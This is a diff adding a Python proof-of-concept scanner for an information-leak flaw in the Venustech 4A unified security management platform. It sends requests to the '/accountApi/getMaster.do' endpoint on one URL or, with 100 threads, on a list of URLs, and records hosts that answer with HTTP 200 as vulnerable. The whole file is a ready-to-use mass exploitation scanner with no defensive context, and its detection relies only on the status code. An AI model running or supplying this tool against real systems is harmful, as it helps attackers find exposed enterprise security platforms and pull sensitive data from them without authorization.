@@ -1,0 +1,65 @@
+# 启明星辰-4A 统一安全管控平台 getMater 信息泄漏
+import requests,sys,argparse
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+
+def banner():
+    test=""" ░▒▓██████▓▒░░▒▓████████▓▒░▒▓████████▓▒░▒▓██████████████▓▒░ ░▒▓██████▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓███████▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░      ░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒▒▓███▓▒░▒▓██████▓▒░    ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░ ░▒▓█▓▒░   ░▒▓██████▓▒░ ░▒▓███████▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
+ ░▒▓██████▓▒░░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+                                                                                                                
+                                                                                                                
+
+"""
+
+    print(test)
+
+
+
+def main():
+    banner()
+    parser=argparse.ArgumentParser(description='启明星辰-4A 统一安全管控平台 getMater 信息泄漏')
+    parser.add_argument('-u','--url',dest='url',type=str,help='input the url')
+    parser.add_argument('-f','--file',dest='file',type=str,help='input the file')
+    args=parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        url_list=[]
+        with open(args.file,'r',encoding='utf-8')as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip())
+        mp=Pool(100)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+
+
+
+def poc(target):
+    url_payload= '/accountApi/getMaster.do'
+    headers={
+        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.881.36 Safari/537.36'
+    }
+
+    try:
+        res1=requests.get(url=target+url_payload,headers=headers,timeout=10)
+        if res1.status_code==200:
+            print( f"[+]{target} 存在漏洞！")
+            with open('result.txt','a',encoding='utf-8')as fp:
+                fp.write(target+'\n')
+                return True
+        else:
+            print('[-] 不存在漏洞')
+            return False
+    except:
+        print('目标网站存在问题，无法访问')
+
+if __name__ =='__main__':
+    main()
